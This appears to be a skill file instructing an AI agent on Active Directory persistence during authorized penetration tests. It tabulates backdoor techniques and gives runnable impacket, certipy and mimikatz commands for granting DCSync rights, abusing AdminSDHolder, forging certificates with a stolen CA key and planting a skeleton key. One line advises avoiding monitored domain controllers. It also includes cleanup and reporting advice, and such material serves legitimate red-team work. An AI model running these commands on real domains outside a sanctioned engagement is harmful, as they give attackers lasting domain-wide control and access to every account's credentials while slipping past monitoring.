---
name: ad-persistence
description: "Active Directory persistence: golden tickets, DCSync rights, skeleton keys, adminSDHolder, and certificate-based backdoors. Use this skill when persistent access to a domain is required within an authorized engagement."
---

# AD Persistence

## Overview

Persistence in AD survives password resets and reboots. Every technique is highly detectable — record what you deploy so it can be removed.

## Techniques

| Technique | Survival |
|---|---|
| Golden ticket (krbtgt) | until krbtgt rotated twice |
| DCSync rights (DS-Replication-Get-Changes-All) | until ACL audited |
| AdminSDHolder ACL | propagates every 60 min |
| Skeleton key (LSASS patch) | until DC reboot |
| Shadow credentials on a DC | until key removed |
| Certificate with long validity | until revoked |
| SID history injection | until ticket expires |
| Golden certificate (CA private key) | until CA re-keyed |

## DCSync rights

```bash
impacket-dacledit -action write -rights DCSync -principal user -target 'DC=domain,DC=local' domain.local/admin:pass
```

Now the user can `secretsdump` at will.

## AdminSDHolder

```bash
# add GenericAll for your user on the AdminSDHolder object
# it propagates to all protected accounts within an hour
impacket-dacledit -action write -rights FullControl -principal user -target 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' domain.local/admin:pass
```

## Golden certificate

```bash
certipy ca -backup -u admin@domain.local -p pass -ca CA-NAME
# forge certificates at will with the CA key
certipy forge -ca-pfx CA.pfx -upn administrator@domain.local -subject 'CN=admin'
```

## Skeleton key

```bash
mimikatz "privilege::debug" "misc::skeleton"
# then any account authenticates with the master password
```

Detected by LSASS integrity checks; do not use on monitored DCs.

## Cleanup

Track every change: ACL modifications, added keys, deployed tickets. An engagement report must list them so the client can verify removal.

## Pitfalls

- `krbtgt` rotation is standard incident response — a golden ticket dies with it.
- AdminSDHolder propagation is not immediate.
- Certificate revocation is often not monitored, making golden certificates the longest-lived.

## Verification

Persistence must be proven by re-authenticating after a password reset of the compromised account.
